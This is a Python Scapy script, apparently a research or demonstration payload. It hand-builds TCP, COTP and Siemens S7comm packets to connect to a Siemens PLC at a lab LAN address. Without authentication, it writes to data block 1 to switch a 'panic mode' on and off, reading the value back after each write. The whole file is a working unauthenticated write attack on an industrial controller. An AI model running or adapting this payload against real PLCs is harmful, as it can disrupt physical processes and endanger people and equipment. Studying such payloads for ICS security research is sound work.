#! /usr/bin/env python3



######## COPYRIGHT ########
# Copyright 2023 Jarno Baselier. All rights reserved.
# This software may be modified and distributed under the terms
# of the "Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) license. https://creativecommons.org/licenses/by-nc-sa/4.0/.

#Based on master-file for Step7 purposes (and configured for a Siemens Logo PLC) called "ics-payload.py":
#https://github.com/mrbaselier/ICS-Payload

#Yes, in this example file I define full packets while I could consolidate the information to make the payload more compact. I have chosen readability and customization over filesize.

# WHAT DOES THIS SCRIPT DO?
# 1. Setup 3-way handshake
# 2. Setup COTP communication
# 3. Setup Step7 communication
# 4. Write the value of 1 in database 1 at offset 0 - This turns on the panic mode (of the specific application I use in this example, this may depend)
# 5. Read the database values
# 6. Pause for 2 seconds
# 7. Write the value of 0 in database 1 at offset 0 - This turns off the panic mode (of the specific application I use in this example, this may depend
# 8. Read the database values



######## IMPORTS ########
from scapy.all import *
import struct
import binascii
import threading
import time
import codecs



######## SETTINGS / VARIABLES ########
#randomize ports: random.randint(20000,50000)
source_ip = '192.168.178.57'
destination_ip = '192.168.178.30'
source_port = random.randint(20000,50000)
destination_port = 102
tcp_start_seq_nr = random.randint(20000,50000)
send_interface = "Ethernet 2"



######## FUNCTIONS ########
def string_to_bytes(value):
        value = str.encode(value)
        #print(value)
        return value

def int_to_bytes_1(value):
        value = value.to_bytes(1, byteorder='big')
        #print(value)
        return value

def int_to_bytes_2(value):
        value = value.to_bytes(2, byteorder='big')
        #print(value)
        return value

def int_to_bytes_4(value):
        value = value.to_bytes(4, byteorder='big')
        #print(value)
        return value



######## PART1 - Start with 3-way handshake - Send SYN and await response ########
l3 = IP(#version=4,
        flags=2,
        proto=6,
        src=source_ip,
        dst=destination_ip
     )
#TCP
#tcp_options = [("MSS" , 1460),('Timestamp', (1098453, 0)),("NOP",None),("WScale",2),("NOP",None),("NOP",None),("SAckOK","")]
tcp_options = [('MSS', 1460), ('SAckOK', b''), ('Timestamp', (3840354, 0)), ('NOP', None), ('WScale', 0)]
l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='S',
        options=tcp_options,
        seq=tcp_start_seq_nr
        )

SYNpacket = l3 / l4

#Show packet
#SYNpacket.show2()

#Send packet and await response
RETURNPACKET = sr1(SYNpacket)



######## PART2 - After receiving SYN/ACK, send an ACK ########
l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='A',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.seq + 1
        )

ACKpacket = l3 / l4

#Show packet
#ACKpacket.show2()

#Send packet
send(ACKpacket)



######## PART3 - INITIATE ISO CONNECTION / ISO TRANSFER ########
#TPKT
tpkt_version = int_to_bytes_1(3)
tpkt_reserved = int_to_bytes_1(0)
tpkt_length = int_to_bytes_2(22)

#Compile Raw part of the TPKT package
TPKT = tpkt_version + tpkt_reserved + tpkt_length
#===================================
#ISO_8073
iso_length = int_to_bytes_1(17)
iso_pdu_type = int_to_bytes_1(224)
iso_dest_ref = int_to_bytes_2(0)
iso_src_ref = int_to_bytes_2(10)
iso_class = int_to_bytes_1(0)
iso_parameter_code = int_to_bytes_1(193)
iso_parameter_length = int_to_bytes_1(2)
iso_source_tsap1 = int_to_bytes_1(2)
iso_source_tsap2 = int_to_bytes_1(0)
iso_parameter_code2 = int_to_bytes_1(194)
iso_parameter_length2 = int_to_bytes_1(2)
iso_dest_tsap1 = int_to_bytes_1(2)
iso_dest_tsap2 = int_to_bytes_1(0)
iso_parameter_code3 = int_to_bytes_1(192)
iso_parameter_length3 = int_to_bytes_1(1)
iso_tpdu_size = int_to_bytes_1(10)

#Compile Raw part of ISO_8073 package
ISO_8073 = iso_length + iso_pdu_type + iso_dest_ref + iso_src_ref + iso_class + iso_parameter_code + iso_parameter_length + iso_source_tsap1 + iso_source_tsap2 + iso_parameter_code2 + iso_parameter_length2 + iso_dest_tsap1 + iso_dest_tsap2 + iso_parameter_code3 + iso_parameter_length3 + iso_tpdu_size
#===================================
payload = TPKT + ISO_8073

l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='PA',
        seq=ACKpacket.seq,
        ack=ACKpacket.ack
        )

CONNpacket = l3 / l4 / payload

#Show packet
#CONNpacket.show2()

#Send packet and await response
RETURNPACKET = sr1(CONNpacket)

RETURNPACKET.show2()



######## PART4 - After receiving COTP return packet, send an ACK ########
l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='A',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

ACKpacket = l3 / l4

#Show packet
#ACKpacket.show2()

#Send packet
send(ACKpacket)



######## PART5 - SETUP COMMUNICATION ########
#TPKT
tpkt_version = int_to_bytes_1(3)
tpkt_reserved = int_to_bytes_1(0)
tpkt_spacer = int_to_bytes_1(0)
tpkt_length = int_to_bytes_1(25)

#Compile Raw part of the TPKT package
TPKT = tpkt_version + tpkt_reserved + tpkt_spacer + tpkt_length
#===================================
#ISO_8073
iso_length = int_to_bytes_1(2)
iso_pdu_type = int_to_bytes_1(240)
iso_tpdu_number = int_to_bytes_1(128)

#Compile Raw part of ISO_8073 package
ISO_8073 = iso_length + iso_pdu_type + iso_tpdu_number

#===================================
#STEP7
s7_protocol_id = int_to_bytes_1(50)
s7_rosctr = int_to_bytes_1(1)
s7_red_id = int_to_bytes_2(0)
s7_protocol_dataunit_ref = int_to_bytes_2(8449)
s7_param_length_pt1 = int_to_bytes_1(0)
s7_param_length_pt2 = int_to_bytes_1(8)
s7_data_length_pt1 = int_to_bytes_1(0)
s7_data_length_pt2 = int_to_bytes_1(0)
s7_function = int_to_bytes_1(240)

s7_reserved = int_to_bytes_1(0)
s7_max_amq_calling = int_to_bytes_2(1)
s7_max_amq_called = int_to_bytes_2(2)
s7_pdu_length = int_to_bytes_2(240)

#Compile Raw part of the Siemens S7 package
SiemensS7 = s7_protocol_id + s7_rosctr + s7_red_id + s7_protocol_dataunit_ref + s7_param_length_pt1 + s7_param_length_pt2 + s7_data_length_pt1 + s7_data_length_pt2 + s7_function + s7_reserved + s7_max_amq_calling + s7_max_amq_called + s7_pdu_length#+ s7_item_count + s7_variable_specification + s7_length_next + s7_syntaxid + s7_transportsize + s7_length_next_address_spec + s7_db_nr + s7_area_data_blocks + s7_address_pt1 + s7_address_pt2 + s7_address_pt3 + s7_return_code + s7_transport_size + s7_item_length + s7_item_data
#===================================

payload = TPKT + ISO_8073 + SiemensS7

l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='PA',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

COMMpacket = l3 / l4 / payload

#Send packet and await response
RETURNPACKET = sr1(COMMpacket)



######## PART6 - After receiving S7COMM return packet, send an ACK ########
l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='A',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

ACKpacket = l3 / l4

#Show packet
#ACKpacket.show2()

#Send packet
send(ACKpacket)



######## PART7 - Write Variables - Turn On - Set item data to 1 in database 1 at offset 0 ########
#TPKT
tpkt_version = int_to_bytes_1(3)
tpkt_reserved = int_to_bytes_1(0)
tpkt_spacer = int_to_bytes_1(0)
tpkt_length = int_to_bytes_1(36)

#Compile Raw part of the TPKT package
TPKT = tpkt_version + tpkt_reserved + tpkt_spacer + tpkt_length
#===================================
#ISO_8073
iso_length = int_to_bytes_1(2)
iso_pdu_type = int_to_bytes_1(240)
iso_tpdu_number = int_to_bytes_1(128)

#Compile Raw part of ISO_8073 package
ISO_8073 = iso_length + iso_pdu_type + iso_tpdu_number

#===================================
#STEP7
s7_protocol_id = int_to_bytes_1(50)
s7_rosctr = int_to_bytes_1(1)
s7_red_id = int_to_bytes_2(0)
s7_protocol_dataunit_ref1 = int_to_bytes_1(1)
s7_protocol_dataunit_ref2 = int_to_bytes_1(2)
s7_param_length_pt1 = int_to_bytes_1(0)
s7_param_length_pt2 = int_to_bytes_1(14)
s7_data_length_pt1 = int_to_bytes_1(0)
s7_data_length_pt2 = int_to_bytes_1(5)
s7_function = int_to_bytes_1(5)
s7_item_count = int_to_bytes_1(1)
#Item
s7_variable_specification = int_to_bytes_1(18)
s7_length_next = int_to_bytes_1(10)
s7_syntaxid = int_to_bytes_1(16)
s7_transportsize = int_to_bytes_1(1)
s7_length_next_address_spec = int_to_bytes_2(1)
s7_db_nr = int_to_bytes_2(1)
s7_area_data_blocks = int_to_bytes_1(132)
s7_address_pt1 = int_to_bytes_1(0)
s7_address_pt2 = int_to_bytes_1(0)
s7_address_pt3 = int_to_bytes_1(0)
#Data
s7_return_code = int_to_bytes_1(255)
s7_transport_size = int_to_bytes_1(3)
s7_item_length = int_to_bytes_2(1)
s7_item_data = int_to_bytes_1(1)

#Compile Raw part of the Siemens S7 package
SiemensS7 = s7_protocol_id + s7_rosctr + s7_red_id + s7_protocol_dataunit_ref1 + s7_protocol_dataunit_ref2 + s7_param_length_pt1 + s7_param_length_pt2 + s7_data_length_pt1 + s7_data_length_pt2 + s7_function + s7_item_count + s7_variable_specification + s7_length_next + s7_syntaxid + s7_transportsize + s7_length_next_address_spec + s7_db_nr + s7_area_data_blocks + s7_address_pt1 + s7_address_pt2 + s7_address_pt3 + s7_return_code + s7_transport_size + s7_item_length + s7_item_data
#===================================

payload = TPKT + ISO_8073 + SiemensS7

l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='PA',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

COMMpacket = l3 / l4 / payload

#Show packet
#COMMpacket.show2()

#Send packet and await response
RETURNPACKET = sr1(COMMpacket)
print("RETURNPACKET")




######## PART8 - After receiving return information, send an ACK ########
l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='A',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

ACKpacket = l3 / l4

#Show packet
#ACKpacket.show2()

#Send packet
send(ACKpacket)



######## PART9 - Read Variables ########
#TPKT
tpkt_version = int_to_bytes_1(3)
tpkt_reserved = int_to_bytes_1(0)
tpkt_spacer = int_to_bytes_1(0)
tpkt_length = int_to_bytes_1(31)

#Compile Raw part of the TPKT package
TPKT = tpkt_version + tpkt_reserved + tpkt_spacer + tpkt_length
#===================================
#ISO_8073
iso_length = int_to_bytes_1(2)
iso_pdu_type = int_to_bytes_1(240)
iso_tpdu_number = int_to_bytes_1(128)

#Compile Raw part of ISO_8073 package
ISO_8073 = iso_length + iso_pdu_type + iso_tpdu_number

#===================================
#STEP7
s7_protocol_id = int_to_bytes_1(50)
s7_rosctr = int_to_bytes_1(1)
s7_red_id = int_to_bytes_2(0)
s7_protocol_dataunit_ref = int_to_bytes_2(258)
s7_param_length_pt1 = int_to_bytes_1(0)
s7_param_length_pt2 = int_to_bytes_1(14)
s7_data_length_pt1 = int_to_bytes_1(0)
s7_data_length_pt2 = int_to_bytes_1(0)
s7_function = int_to_bytes_1(4)
s7_item_count = int_to_bytes_1(1)
#Item
s7_variable_specification = int_to_bytes_1(18)
s7_length_next = int_to_bytes_1(10)
s7_syntaxid = int_to_bytes_1(16)
s7_transportsize = int_to_bytes_1(1)
s7_length_next_address_spec = int_to_bytes_2(1)
s7_db_nr = int_to_bytes_2(1)
s7_area_data_blocks = int_to_bytes_1(132)
s7_address_pt1 = int_to_bytes_1(0)
s7_address_pt2 = int_to_bytes_1(0)
s7_address_pt3 = int_to_bytes_1(0)

#Compile Raw part of the Siemens S7 package
SiemensS7 = s7_protocol_id + s7_rosctr + s7_red_id + s7_protocol_dataunit_ref + s7_param_length_pt1 + s7_param_length_pt2 + s7_data_length_pt1 + s7_data_length_pt2 + s7_function + s7_item_count + s7_variable_specification + s7_length_next + s7_syntaxid + s7_transportsize + s7_length_next_address_spec + s7_db_nr + s7_area_data_blocks + s7_address_pt1 + s7_address_pt2 + s7_address_pt3
#===================================

payload = TPKT + ISO_8073 + SiemensS7

l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='PA',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

COMMpacket = l3 / l4 / payload

#Show packet
#COMMpacket.show2()

#Send packet and await response
RETURNPACKET = sr1(COMMpacket)



######## PART10 - After receiving return information, send an ACK ########
l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='A',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

ACKpacket = l3 / l4

#Show packet
#ACKpacket.show2()

#Send packet
send(ACKpacket)



######## PART11 - Pause for 2 seconds ########
time.sleep(2)



######## PART12 - Write Variables - Turn Off - Set item data to 0 in database 1 at offset 0 ########
#TPKT
tpkt_version = int_to_bytes_1(3)
tpkt_reserved = int_to_bytes_1(0)
tpkt_spacer = int_to_bytes_1(0)
tpkt_length = int_to_bytes_1(36)

#Compile Raw part of the TPKT package
TPKT = tpkt_version + tpkt_reserved + tpkt_spacer + tpkt_length
#===================================
#ISO_8073
iso_length = int_to_bytes_1(2)
iso_pdu_type = int_to_bytes_1(240)
iso_tpdu_number = int_to_bytes_1(128)

#Compile Raw part of ISO_8073 package
ISO_8073 = iso_length + iso_pdu_type + iso_tpdu_number

#===================================
#STEP7
s7_protocol_id = int_to_bytes_1(50)
s7_rosctr = int_to_bytes_1(1)
s7_red_id = int_to_bytes_2(0)
s7_protocol_dataunit_ref1 = int_to_bytes_1(1)
s7_protocol_dataunit_ref2 = int_to_bytes_1(2)
s7_param_length_pt1 = int_to_bytes_1(0)
s7_param_length_pt2 = int_to_bytes_1(14)
s7_data_length_pt1 = int_to_bytes_1(0)
s7_data_length_pt2 = int_to_bytes_1(5)
s7_function = int_to_bytes_1(5)
s7_item_count = int_to_bytes_1(1)
#Item
s7_variable_specification = int_to_bytes_1(18)
s7_length_next = int_to_bytes_1(10)
s7_syntaxid = int_to_bytes_1(16)
s7_transportsize = int_to_bytes_1(1)
s7_length_next_address_spec = int_to_bytes_2(1)
s7_db_nr = int_to_bytes_2(1)
s7_area_data_blocks = int_to_bytes_1(132)
s7_address_pt1 = int_to_bytes_1(0)
s7_address_pt2 = int_to_bytes_1(0)
s7_address_pt3 = int_to_bytes_1(0)
#Data
s7_return_code = int_to_bytes_1(255)
s7_transport_size = int_to_bytes_1(3)
s7_item_length = int_to_bytes_2(1)
s7_item_data = int_to_bytes_1(0)

#Compile Raw part of the Siemens S7 package
SiemensS7 = s7_protocol_id + s7_rosctr + s7_red_id + s7_protocol_dataunit_ref1 + s7_protocol_dataunit_ref2 + s7_param_length_pt1 + s7_param_length_pt2 + s7_data_length_pt1 + s7_data_length_pt2 + s7_function + s7_item_count + s7_variable_specification + s7_length_next + s7_syntaxid + s7_transportsize + s7_length_next_address_spec + s7_db_nr + s7_area_data_blocks + s7_address_pt1 + s7_address_pt2 + s7_address_pt3 + s7_return_code + s7_transport_size + s7_item_length + s7_item_data
#===================================

payload = TPKT + ISO_8073 + SiemensS7

l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='PA',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

COMMpacket = l3 / l4 / payload

#Show packet
#COMMpacket.show2()

#Send packet and await response
RETURNPACKET = sr1(COMMpacket)
print("RETURNPACKET")




######## PART13 - After receiving return information, send an ACK ########
l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='A',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

ACKpacket = l3 / l4

#Show packet
#ACKpacket.show2()

#Send packet
send(ACKpacket)



######## PART14 - Read Variables ########
#TPKT
tpkt_version = int_to_bytes_1(3)
tpkt_reserved = int_to_bytes_1(0)
tpkt_spacer = int_to_bytes_1(0)
tpkt_length = int_to_bytes_1(31)

#Compile Raw part of the TPKT package
TPKT = tpkt_version + tpkt_reserved + tpkt_spacer + tpkt_length
#===================================
#ISO_8073
iso_length = int_to_bytes_1(2)
iso_pdu_type = int_to_bytes_1(240)
iso_tpdu_number = int_to_bytes_1(128)

#Compile Raw part of ISO_8073 package
ISO_8073 = iso_length + iso_pdu_type + iso_tpdu_number

#===================================
#STEP7
s7_protocol_id = int_to_bytes_1(50)
s7_rosctr = int_to_bytes_1(1)
s7_red_id = int_to_bytes_2(0)
s7_protocol_dataunit_ref = int_to_bytes_2(258)
s7_param_length_pt1 = int_to_bytes_1(0)
s7_param_length_pt2 = int_to_bytes_1(14)
s7_data_length_pt1 = int_to_bytes_1(0)
s7_data_length_pt2 = int_to_bytes_1(0)
s7_function = int_to_bytes_1(4)
s7_item_count = int_to_bytes_1(1)
#Item
s7_variable_specification = int_to_bytes_1(18)
s7_length_next = int_to_bytes_1(10)
s7_syntaxid = int_to_bytes_1(16)
s7_transportsize = int_to_bytes_1(1)
s7_length_next_address_spec = int_to_bytes_2(1)
s7_db_nr = int_to_bytes_2(1)
s7_area_data_blocks = int_to_bytes_1(132)
s7_address_pt1 = int_to_bytes_1(0)
s7_address_pt2 = int_to_bytes_1(0)
s7_address_pt3 = int_to_bytes_1(0)

#Compile Raw part of the Siemens S7 package
SiemensS7 = s7_protocol_id + s7_rosctr + s7_red_id + s7_protocol_dataunit_ref + s7_param_length_pt1 + s7_param_length_pt2 + s7_data_length_pt1 + s7_data_length_pt2 + s7_function + s7_item_count + s7_variable_specification + s7_length_next + s7_syntaxid + s7_transportsize + s7_length_next_address_spec + s7_db_nr + s7_area_data_blocks + s7_address_pt1 + s7_address_pt2 + s7_address_pt3
#===================================

payload = TPKT + ISO_8073 + SiemensS7

l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='PA',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

COMMpacket = l3 / l4 / payload

#Show packet
#COMMpacket.show2()

#Send packet and await response
RETURNPACKET = sr1(COMMpacket)



######## PART15 - After receiving return information, send an ACK ########
l4 = TCP(sport=source_port,
        dport=destination_port,
        flags='A',
        seq=RETURNPACKET.ack,
        ack=RETURNPACKET.len + RETURNPACKET.seq-40
        )

ACKpacket = l3 / l4

#Show packet
#ACKpacket.show2()

#Send packet
send(ACKpacket)